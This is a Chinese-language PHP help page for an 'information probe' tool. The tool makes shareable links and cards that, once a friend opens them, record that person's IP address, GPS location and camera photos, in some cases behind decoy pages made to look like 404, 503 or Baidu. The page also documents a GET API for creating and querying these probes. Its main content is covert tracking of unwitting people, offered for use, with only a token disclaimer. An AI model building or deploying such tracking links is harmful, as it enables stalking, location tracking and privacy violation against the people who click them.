<?php include_once("./include/reception/header.php"); ?>
<fieldset class="layui-elem-field">
  <legend>使用帮助</legend>
	<div class="layui-field-box">

<div class="layui-collapse" lay-filter="use_help_collapse">
	<div class="layui-colla-item">
	<h2 class="layui-colla-title">怎样使用信息探针？</h2>
	<div class="layui-colla-content">
		<p>1.输入密钥后添加探针，返回一个链接/卡片，发送给好友<br>
		2.好友点击链接/卡片后，点击网站上方的探针查询，即可查询IP及其他信息<br>
		3.禁止非法用途，如造成严重后果作者不负责<br>
		4.如该程序违法，请联系作者/站长</p>
	</div>
	</div>
	
  <div class="layui-colla-item">
    <h2 class="layui-colla-title">什么是信息探针？</h2>
    <div class="layui-colla-content">
      <p>信息探针是一款基于Layui开发的专业查询好友个人信息的程序</p>
    </div>
  </div>
  <div class="layui-colla-item">
    <h2 class="layui-colla-title">怎样填写密钥？</h2>
    <div class="layui-colla-content">
      <p>密钥可根据个人的喜爱填写字母/数字，不受长度限制</p>
    </div>
  </div>
  <div class="layui-colla-item">
    <h2 class="layui-colla-title">为什么会显示出密钥已经存在</h2>
    <div class="layui-colla-content">
      <p>你所填写的密钥可能已经被别的人使用了</p>
    </div>
  </div>
  <div class="layui-colla-item">
    <h2 class="layui-colla-title">为什么打开链接查询却没有数据？</h2>
    <div class="layui-colla-content">
      <p>可能因为网络原因/程序本身的问题导致记录失败</p>
    </div>
  </div>
  <div class="layui-colla-item">
  <h2 class="layui-colla-title">为什么查询数据会显示获取失败？</h2>
  <div class="layui-colla-content">
  	<p>可能因为网络原因/程序本身/打开链接用户的问题导致记录所要查询的人信息失败(IP/GPS/摄像头拍照等可能因为无权限无法获取)</p>
  </div>
  </div>

  <div class="layui-colla-item">
  <h2 class="layui-colla-title">为什么IP定位差距会很大？</h2>
  <div class="layui-colla-content">
  	<p>因为移动数据的原因，显示的是基站的IP和基站的位置</p>
  </div>
  </div>

	<div class="layui-colla-item">
	<h2 class="layui-colla-title">程序有API？</h2>
	<div class="layui-colla-content">
		<p>程序有API的，站长可在后台设置。GET请求<br>
		1.探针添加:api.php?type=add&key=密钥&page=页面&ip_location_function=1&gps_location_function=0&camera_img_function=0&email_notification_function=0&email=<br>
		2.探针查询:api.php?type=query&key=密钥<br>3.页面:404，503，new，stop，hello，baidu(页面如不填以上，会造成记录失败)，功能:0代表不启用，1代表启用</p>
	</div>
	</div>
	

</div>
  </div>
</fieldset>
<?php include_once("./include/reception/footer.php"); ?>